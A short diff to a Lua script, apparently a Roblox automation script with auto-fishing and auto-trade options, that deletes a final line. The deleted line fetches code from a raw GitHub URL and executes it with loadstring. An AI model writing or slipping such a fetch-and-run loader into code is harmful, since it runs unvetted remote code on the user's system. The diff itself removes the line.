@@ -616,5 +616,3 @@ task.delay(2, function()
     if MasterConfig.FishingEnabled then StartFishingV1() end
     if MasterConfig.AutoTrade then RunAutoTrade() end
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/abinoldi/muffinz/refs/heads/main/weatherx"))()
